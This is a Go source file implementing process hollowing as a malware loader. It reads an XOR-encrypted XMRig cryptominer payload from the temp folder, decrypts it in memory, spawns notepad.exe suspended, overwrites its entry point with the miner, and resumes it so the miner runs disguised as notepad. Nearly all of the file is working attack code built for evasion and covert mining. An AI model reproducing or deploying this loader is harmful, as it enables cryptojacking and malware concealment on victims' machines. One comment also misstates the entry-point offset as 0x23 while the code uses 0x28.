package main

//Process Hollowing: invloves creating a process in a suspended state then unmapping its memory to be replace with malicious code
import (
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// PROCESS_BASIC_INFORMATION: holds process information from windows API
type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr //Pointer to Process Environment Block(PEB)
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr //Process ID
	MoreReserved uintptr
}

func main() {
	//=========1. Get the temp directory for payload storage
	tempDir := os.TempDir()
	fmt.Printf("[+]Temp directory: %v\n", tempDir)

	//Construct the full path to the encrypted payload file
	payloadPath := filepath.Join(tempDir, "xmrig.bin")

	//======2. Read and decrypt the payload in memory, not on disk
	xmrigPayload, err := readAndDecryptPayload(payloadPath)
	if err != nil {
		log.Fatalf("[-] Failed to read/decrypt payloadd: %v", err)
	}
	fmt.Printf("[+]Payload decrypted, size: %d bytes \n", len(xmrigPayload))

	//====3. Start Process Hollowing
	//Process startup and information structure
	var startupInfo windows.StartupInfo
	var outProcInfo windows.ProcessInformation

	//Path to our legutumate process we will Hollow
	path := "C:\\Windows\\System32\\notepad.exe"

	//Create notepad.exe process in suspended state
	//CREATE_SUSPENDED flag(0x00000004) creates process but doesn't run it
	err = windows.CreateProcess(nil,
		windows.StringToUTF16Ptr(path), //supply the path to target process
		nil,                            //Security attribute
		nil,                            //Thread security attribute
		false,                          //inherit threads
		windows.CREATE_SUSPENDED,       // our process is suspended
		nil,                            //environment
		nil,                            //current directory
		&startupInfo,                   //startup info
		&outProcInfo)                   //Process information

	if err != nil {
		log.Fatalf("[-] Failed to create Process: %v", err)
	}

	fmt.Printf("[+] Process Created from path: %s with PID: %d\n", path, outProcInfo.ProcessId)

	fmt.Printf("[+]Process Handle: %x \n[+] Thread Handle: %x\n", outProcInfo.Process, outProcInfo.Thread)

	//Querying Process information to find the PEB(process environment block)
	var ProcessInformation PROCESS_BASIC_INFORMATION
	ProcessInformationLength := uint32(unsafe.Sizeof(ProcessInformation))
	var ReturnLength uint32

	//NtQueryInformationProcess: gets detailed process info including PEB location
	//The '0' parameter requests ProcessBasicInformation
	err = windows.NtQueryInformationProcess(outProcInfo.Process, 0, unsafe.Pointer(&ProcessInformation), ProcessInformationLength, &ReturnLength)

	if err != nil {
		log.Fatalf("[-] Failed to query information Process:  %v", err)
	}

	//PEB+0x10 offset contains the ImageBaseAddress pointer
	//This is where the executable is loaded in memory
	ImageBaseAddress := ProcessInformation.PebAddress + 0x10
	fmt.Printf("[+]Address holding image base address: 0x%x\n", ImageBaseAddress)

	//Read the actual image base address from memory
	lpBuffer := make([]byte, unsafe.Sizeof(uintptr(0)))
	var lpNumberOfBytesRead uintptr

	//Read the ImageBaseAddress value from the PEB
	err = windows.ReadProcessMemory(outProcInfo.Process, ImageBaseAddress, &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)
	if err != nil {
		log.Fatalf("[-]Failed to ReadProcessMemory --ImageBaseAddress:  %v", err)
	}
	fmt.Printf("[+]Number of bytes read: %d\n", lpNumberOfBytesRead)

	//convert bytes to actual memory address(little endian format)
	lpBaseAddress := binary.LittleEndian.Uint64(lpBuffer)
	fmt.Printf("[+] Image base: 0x%x/n", lpBaseAddress)

	//Read the PE header to find the entry point
	lpBuffer = make([]byte, 0x200) //Buffer for PE header(512 bytes)

	//Read the PE header from the image base
	err = windows.ReadProcessMemory(outProcInfo.Process, uintptr(lpBaseAddress), &lpBuffer[0], uintptr(len(lpBuffer)), &lpNumberOfBytesRead)

	if err != nil {
		log.Fatalf("[-] Failed to Read memory Address -- lpBaseAddress: %v", err)
	}

	//PE header start at offset 0x3C- this contains the PE signature offset
	lfaNewPos := lpBuffer[0x3c : 0x3C+0x4]
	lfanew := binary.LittleEndian.Uint32(lfaNewPos)
	fmt.Printf("[+] PE siganture offset: 0x%x\n", lfanew)

	//Entry point RVA(relative virtual address)is at PE header + 0x23
	entrypointOffset := lfanew + 0x28
	entrypointOffsetPos := lpBuffer[entrypointOffset : entrypointOffset+0x4]
	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
	fmt.Printf("[+]Entry poin RVA: 0x%x\n", entrypointRVA)

	//Calculate actual entry point address in memory
	entrypointAddress := lpBaseAddress + uint64(entrypointRVA)
	fmt.Printf("[+] Entry Point Address Identified: 0x%x\n", entrypointAddress)

	//===4. Write the XMrig Payload to the entry point- replacing original code
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(outProcInfo.Process, uintptr(entrypointAddress), &xmrigPayload[0], uintptr(len(xmrigPayload)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[-] Failed to WriteProcessMemory: %v", err)
	}
	fmt.Printf("[+] Wrote %d/%d bytes to entry point\n", numberOfBytesWritten, len(xmrigPayload))

	//===5 Resume the suspended thread- executes XMRig instead of notepad
	_, err = windows.ResumeThread(outProcInfo.Thread)
	if err != nil {
		log.Fatalf("[-] Can't resume Thread: %v\n", err)
	}

	fmt.Println("[+]Resumed suspended thread- XMRig should now be running in notepad's memory")
	fmt.Printf("[+] Process hollowing completed successfully")

	//clean up handles to avoid resource leaks
	defer windows.CloseHandle(outProcInfo.Process)
	defer windows.CloseHandle(outProcInfo.Thread)

}

// reads and decrypts the XMrig payload from disk
func readAndDecryptPayload(filePath string) ([]byte, error) {
	//Read encrypted payload from disk
	encryptedData, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload file: %v", err)
	}

	fmt.Printf("[+] Read %d bytes from payload file\n", len(encryptedData))

	//simple XOR decryption(replace with actual decryption logic)
	decryptedData := decryptXor(encryptedData, "K")

	return decryptedData, nil
}

// decryptXor, implements simple XOR decryption
func decryptXor(encryptedData []byte, key string) []byte {
	decrypted := make([]byte, len(encryptedData))

	keyBytes := []byte(key)

	//XOR each byte of encrypted data with key bytes
	for i := 0; i < len(encryptedData); i++ {
		decrypted[i] = encryptedData[i] ^ keyBytes[i%len(keyBytes)]
	}

	return decrypted
}
